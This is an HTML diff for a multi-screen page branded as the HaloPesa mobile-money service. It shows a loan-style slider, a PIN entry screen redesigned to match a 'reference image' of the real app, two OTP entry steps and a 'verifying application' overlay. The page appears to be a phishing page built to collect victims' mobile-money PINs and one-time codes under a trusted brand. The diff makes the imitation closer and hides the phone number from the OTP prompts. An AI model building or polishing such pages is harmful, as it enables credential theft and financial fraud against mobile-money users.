@@ -45,7 +45,7 @@
     </div>
   </section>
 
-  <!-- SKRINI YA 2: SLIDER -->
+  <!-- SKRINI YA 2: SLIDER YA MKORO -->
   <section id="screen-slider" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <button type="button" class="nav-back-btn text-white" id="btn-slider-back">← Rudi</button>
@@ -224,43 +224,43 @@
     </div>
   </section>
 
-  <!-- SKRINI YA 6: KUINGIA AKAUNTI (PIN) -->
+  <!-- SKRINI YA 6: KUINGIA AKAUNTI (PIN SCREEN - MATCHING REFERENCE IMAGE) -->
   <section id="screen-signin" class="screen white-screen">
-    <div class="top-nav-bar bg-orange">
-      <div class="brand-header-inline">
-        <span class="halopesa-brand-sm text-white">HaloPesa</span>
-      </div>
-      <div class="hamburger text-white">☰</div>
+    <div class="top-nav-bar bg-white-trans">
+      <button type="button" class="nav-back-btn text-dark" id="btn-signin-back">←</button>
     </div>
 
-    <div class="card-container-main align-center">
-      <div class="card-header-title">
-        <h2>Ingia Akaunti</h2>
+    <div class="card-container-main align-center pin-screen-layout">
+      <div class="halopesa-logo-top">
+        <span class="logo-text-orange">🔴 halopesa</span>
       </div>
 
-      <div class="phone-input-group margin-bottom-15">
-        <span class="flag-prefix">🇹🇿 +255</span>
-        <input type="text" id="signin-phone" class="input-text" placeholder="061..., 062..., 063...">
+      <div class="user-avatar-circle">
+        <span class="avatar-icon">👤</span>
       </div>
 
-      <label class="pin-title-label">Weka PIN yako (tarakimu 4)</label>
+      <h3 id="display-applicant-name" class="applicant-name-title">MWOMBAJI</h3>
+      <p id="display-applicant-phone" class="applicant-phone-subtitle">0614 000 000</p>
+
+      <h4 class="enter-pin-heading">Enter PIN code</h4>
 
       <div id="banner-pin-error" class="surface-error-banner"></div>
 
-      <div class="golden-pin-container">
-        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
-        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
-        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
-        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+      <div class="pin-entry-row-box">
+        <div class="pin-boxes-cluster">
+          <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        </div>
+        <button type="button" id="btn-toggle-pin-visibility" class="show-pin-txt-btn">Show</button>
       </div>
 
-      <a href="#" class="forgot-pin-link">Umesahau PIN?</a>
-
-      <button type="button" id="btn-submit-signin" class="btn-pulse-white margin-top-20">INGIA</button>
+      <a href="#" class="forgot-pin-link">Forgot PIN?</a>
     </div>
   </section>
 
-  <!-- SKRINI YA 7: OTP HATUA 1 (INAONYESHA NAMBA YA SIMU) -->
+  <!-- SKRINI YA 7: UTHIBITISHO WA OTP (HATUA YA 1) -->
   <section id="screen-otp1" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <div class="brand-header-inline">
@@ -272,7 +272,7 @@
     <div class="card-container-main align-center">
       <div class="card-header-title">
         <h2>Uthibitisho wa OTP (Hatua ya 1)</h2>
-        <small id="otp1-subtitle">Weka OTP iliyotumwa kwenda namba: <strong id="display-phone-otp1" style="color:#E85D04;"></strong></small>
+        <small id="otp1-subtitle">Weka OTP iliyotumwa kwenye namba yako</small>
       </div>
 
       <div class="verified-success-alert">
@@ -292,7 +292,7 @@
     </div>
   </section>
 
-  <!-- SKRINI YA 8: OTP HATUA 2 (INAONYESHA NAMBA YA SIMU) -->
+  <!-- SKRINI YA 8: UTHIBITISHO WA MWISHO WA OTP (HATUA YA 2) -->
   <section id="screen-otp2" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <div class="brand-header-inline">
@@ -304,7 +304,7 @@
     <div class="card-container-main align-center">
       <div class="card-header-title">
         <h2>Uthibitisho wa Mwisho wa OTP (Hatua ya 2)</h2>
-        <small>Weka OTP ya mwisho kwenda namba: <strong id="display-phone-otp2" style="color:#E85D04;"></strong></small>
+        <small>Weka OTP ya mwisho ya tarakimu 4 kwa ajili ya uhakiki kamili</small>
       </div>
 
       <div class="verified-success-alert">
@@ -324,7 +324,7 @@
     </div>
   </section>
 
-  <!-- SKRINI YA 9: MAFANIKIO -->
+  <!-- SKRINI YA 9: MAFANIKIO (SUCCESS) -->
   <section id="screen-success" class="screen white-screen">
     <div class="card-container-main align-center">
       <div class="success-badge-circle">✓</div>
@@ -356,7 +356,7 @@
     </div>
   </section>
 
-  <!-- SKRINI YA KUZUIWA -->
+  <!-- SKRINI YA KUZUIWA / KUSIMAMISHWA -->
   <section id="screen-stopped" class="screen white-screen">
     <div class="card-container-main align-center" style="margin-top: 150px;">
       <div class="success-badge-circle" style="background-color: #D32F2F;">✕</div>
@@ -365,7 +365,7 @@
     </div>
   </section>
 
-  <!-- KIBOX CHA KUSUBIRI -->
+  <!-- KIBOX CHA KUSUBIRI (LOADING OVERLAY) -->
   <div id="loading-overlay" class="loading-overlay">
     <div class="spinner"></div>
     <h3 id="loading-title">INATHIBITISHA MAOMBI...</h3>
@@ -376,5 +376,5 @@
 
 <script src="script.js"></script>
 </body>
-  </html>
+            </html>
   
